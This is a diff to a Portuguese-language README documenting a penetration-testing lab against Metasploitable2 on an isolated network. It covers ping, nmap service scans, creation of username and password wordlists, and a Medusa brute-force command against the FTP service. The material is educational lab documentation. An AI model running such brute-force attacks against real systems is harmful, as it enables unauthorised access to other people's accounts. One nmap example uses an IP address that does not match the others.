@@ -15,8 +15,8 @@ Este repositório documenta **passo a passo** a montagem de um laboratório de P
 - VM Alvo: Metasploitable2.
 - Rede: Host-only / Internal Network para isolamento do laboratório.
 - Endereços:
-- Kali: 192.168.56.102;
-- Metasploitable2: 192.168.56.101.
+- Kali: 192.168.56.5;
+- Metasploitable2: 192.168.56.4.
   
 > Dica: use snapshots antes de cada experimento para permitir rollback rápido.
 
@@ -63,9 +63,9 @@ ping -c 4 [endereço ip do metasploitable2]
 
 Exemplo: 
 ```bash
-ping -c 4 192.168.56.101
+ping -c 4 192.168.56.4
 ```
-<img width="765" height="498" alt="image" src="https://github.com/user-attachments/assets/67f96c36-473f-474a-b7a7-a214a21da3f8" />
+<img width="737" height="488" alt="image" src="https://github.com/user-attachments/assets/7c30a8ce-0a6e-4848-8568-3cfb28890008" />
 
 ## Reconhecimento das portas com Nmap
 
@@ -74,18 +74,18 @@ Para reconhecimento padrão vamos executar o comando `nmap` [endereço ip do met
 Exemplo: 
 
 ```bash
-nmap 192.168.56.101
+nmap 192.168.56.3
 ```
 
-<img width="745" height="538" alt="image" src="https://github.com/user-attachments/assets/e3ed9481-b651-4ea7-a9da-59d186f0f10a" />
+<img width="751" height="542" alt="image" src="https://github.com/user-attachments/assets/ae822b03-81e1-4604-9203-e0acefd3516e" />
 
 Vamos focar nas portas 21, 22, 80, 445 e 139 com o comando:
 
 ```bash
-nmap -sV -p 21,22,80,445,139 192.168.56.101
+nmap -sV -p 21,22,80,445,139 192.168.56.4
 ```
 
-<img width="735" height="295" alt="image" src="https://github.com/user-attachments/assets/61c76e11-4ff3-46df-8fbd-0b6cf5dd75ed" />
+<img width="749" height="354" alt="image" src="https://github.com/user-attachments/assets/02eb7687-08c4-4907-8282-aaf84fa2dc41" />
 
 ## Teste na porta FTP
 
@@ -93,4 +93,31 @@ Pode-se identificar a porta 21 (FTP), onde a mesma é utilizada para tranferênc
 
 ### Identificação da porta utilizando o Nmap
 
-<img width="679" height="376" alt="nmap_metasploitable2" src="https://github.com/user-attachments/assets/ae411fd4-2725-4464-ad09-674510b33e60" />
+<img width="754" height="354" alt="Captura de tela 2025-10-12 225932" src="https://github.com/user-attachments/assets/92896092-9234-4c6e-8262-8f9dabfceb65" />
+
+### Criação das wordlists
+
+Nesta etapa criamos duas wordlists. Uma lista com os nome de usuários e outra com as possíveis senhas. Segue abaixo os comandos para a criação das listas:
+
+Criação da lista de usuários:
+```bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+```
+
+Criação da lista de senhas:
+```bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+
+### Medusa: Ataque de brute force utilizando as wordlists criadas
+
+Nesta etapa vamos utilizar a ferramenta `Medusa` para realizar um ataque de força bruta utilizando as listas na porta 21 do serviço `ftp`. Segue o comando abaixo:
+
+```bash
+medusa -h 192.168.56.4 -U users.txt -P pass.txt -M ftp -t 6
+```
+<img width="1062" height="424" alt="Captura de tela 2025-10-14 125415" src="https://github.com/user-attachments/assets/cdc00c71-7c8c-4160-b7a0-be775e03a0a2" />
+
+
+
+
